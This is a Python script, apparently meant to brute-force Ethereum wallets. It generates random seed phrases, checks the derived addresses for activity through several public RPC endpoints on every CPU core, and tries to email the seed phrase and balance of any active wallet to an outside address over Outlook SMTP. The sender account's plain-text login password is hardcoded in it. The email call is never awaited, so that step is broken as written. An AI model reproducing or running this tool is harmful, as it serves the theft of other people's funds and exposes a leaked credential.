import asyncio
import time
import os
import smtplib
import aiohttp
from email.message import EmailMessage
from bip_utils import Bip44, Bip44Coins, Bip44Changes, Bip39MnemonicGenerator, Bip39SeedGenerator, EthAddr, Bip39WordsNum
import multiprocessing
import aiosmtplib

async def generate_eth_address():
    mnemonic = Bip39MnemonicGenerator().FromWordsNumber(Bip39WordsNum.WORDS_NUM_12)
    seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
    bip_obj = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM)
    acct = bip_obj.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)

    return mnemonic, acct.PublicKey().ToAddress(), acct.PrivateKey().Raw().ToHex()

async def get_eth_balance(address, rpc_server_address, rpc_server_addresses):
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                payload = {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "eth_getBalance",
                    "params": [address, "latest"]
                }
                headers = {'Content-Type': 'application/json'}
                async with session.post(rpc_server_address, json=payload, headers=headers) as response:
                    response.raise_for_status()
                    result = await response.json(content_type=None)

                    if "result" in result:
                        balance = int(result["result"], 16)
                        return balance / (10**18)
                    else:
                        print(f"Unexpected response: {result}. Switching to the next RPC server.")
                        rpc_server_address = rpc_server_addresses[(rpc_server_addresses.index(rpc_server_address) + 1) % len(rpc_server_addresses)]

            except (aiohttp.ClientResponseError, aiohttp.ContentTypeError, aiohttp.ClientConnectorError) as e:
                if isinstance(e, aiohttp.ClientResponseError) and 400 <= e.status < 600:
                    print("Too Many Requests: Switching to the next RPC server.")
                elif isinstance(e, aiohttp.ContentTypeError):
                    print("Unexpected content type: Switching to the next RPC server.")
                elif isinstance(e, aiohttp.ClientConnectorError):
                    print("Cannot connect to host: Switching to the next RPC server.")
                else:
                    raise
                rpc_server_address = rpc_server_addresses[(rpc_server_addresses.index(rpc_server_address) + 1) % len(rpc_server_addresses)]
            except aiohttp.client_exceptions.ServerDisconnectedError:
                print("Server disconnected: Switching to the next RPC server.")
                rpc_server_address = rpc_server_addresses[(rpc_server_addresses.index(rpc_server_address) + 1) % len(rpc_server_addresses)]
            except Exception as e:
                print(f"Error occurred: {e}")
                raise

async def get_transaction_count(address, rpc_server_address, rpc_server_addresses):
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                payload = {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "eth_getTransactionCount",
                    "params": [address, "latest"]
                }
                headers = {'Content-Type': 'application/json'}
                async with session.post(rpc_server_address, json=payload, headers=headers) as response:
                    response.raise_for_status()
                    result = await response.json(content_type=None)
                    
                    if "result" in result:
                        transaction_count = int(result["result"], 16)
                        return transaction_count
                    else:
                        print(f"Unexpected response: {result}. Switching to the next RPC server.")
                        rpc_server_address = rpc_server_addresses[(rpc_server_addresses.index(rpc_server_address) + 1) % len(rpc_server_addresses)]

            except (aiohttp.ClientResponseError, aiohttp.ContentTypeError) as e:
                if isinstance(e, aiohttp.ClientResponseError) and 400 <= e.status < 600:
                    print("Too Many Requests: Switching to the next RPC server.")
                elif isinstance(e, aiohttp.ContentTypeError):
                    print("Unexpected content type: Switching to the next RPC server.")
                else:
                    raise
                rpc_server_address = rpc_server_addresses[(rpc_server_addresses.index(rpc_server_address) + 1) % len(rpc_server_addresses)]
            except aiohttp.client_exceptions.ServerDisconnectedError:
                print("Server disconnected: Switching to the next RPC server.")
                rpc_server_address = rpc_server_addresses[(rpc_server_addresses.index(rpc_server_address) + 1) % len(rpc_server_addresses)]
            except Exception as e:
                print(f"Error occurred: {e}")
                raise

async def send_email(address, mnemonic, balance, rpc_server_address):
    your_email = "devtesthana@outlook.com"
    your_password = "musjgtdjhbhxkima"
    recipient_email = "penya.shk@gmail.com"

    msg = EmailMessage()
    msg.set_content(f"Address: {address}\nMnemonic: {mnemonic}\nBalance: {balance}\nRPC Server Address: {rpc_server_address}")
    msg["Subject"] = "Ethereum address with balance > 0"
    msg["From"] = your_email
    msg["To"] = recipient_email

    async with aiosmtplib.SMTP(hostname="smtp.office365.com", port=587, use_tls=True) as smtp:
        await smtp.login(your_email, your_password)
        await smtp.send_message(msg)

async def main_async():
    num_addresses = 100
    results = []

    start_time = time.time()

    rpc_server_addresses = [
        'https://eth.llamarpc.com',
        'https://rpc.ankr.com/eth',
        'https://ethereum.publicnode.com',
        'https://eth-mainnet.public.blastapi.io',
        # 'https://eth.api.onfinality.io/public',
        'https://singapore.rpc.blxrbdn.com',
        'https://cloudflare-eth.com',
        # 'https://virginia.rpc.blxrbdn.com',
        'https://api.securerpc.com/v1',
    ]

    end_time = time.time() + 24 * 60 * 60 * 60  # n時間後の時刻を設定

    loop_counter = 0  # ループ回数をカウントする変数を追加

    while time.time() < end_time:
        loop_counter += 1  # ループ開始時にカウンターをインクリメント

        tasks = [generate_eth_address() for _ in range(num_addresses)]

        results = await asyncio.gather(*tasks)

        for i, (mnemonic, address, private_key) in enumerate(results):
            rpc_server_address = rpc_server_addresses[i % len(rpc_server_addresses)]
            transaction_count = await get_transaction_count(address, rpc_server_address, rpc_server_addresses)
            print(f"Address {i + 1}: {address}: {rpc_server_address}: {transaction_count}: {mnemonic}")  # 番号とアドレスを表示

            if transaction_count > 0:
                balance = await get_eth_balance(address, rpc_server_address, rpc_server_addresses)
                send_email(address, mnemonic, balance, rpc_server_address)
                print("Sent email with address and mnemonic.")

        results.clear()

        elapsed_time = time.time() - start_time
        print(f"ループ{loop_counter}回目 処理にかかった時間: {elapsed_time} 秒")  # ループ回数を表示
        print("Waiting for the next loop...")


def worker():
    asyncio.run(main_async())

def main():
    num_workers = multiprocessing.cpu_count()
    processes = []

    for _ in range(num_workers):
        p = multiprocessing.Process(target=worker)
        p.start()
        processes.append(p)

    for p in processes:
        p.join()

if __name__ == "__main__":
    main()
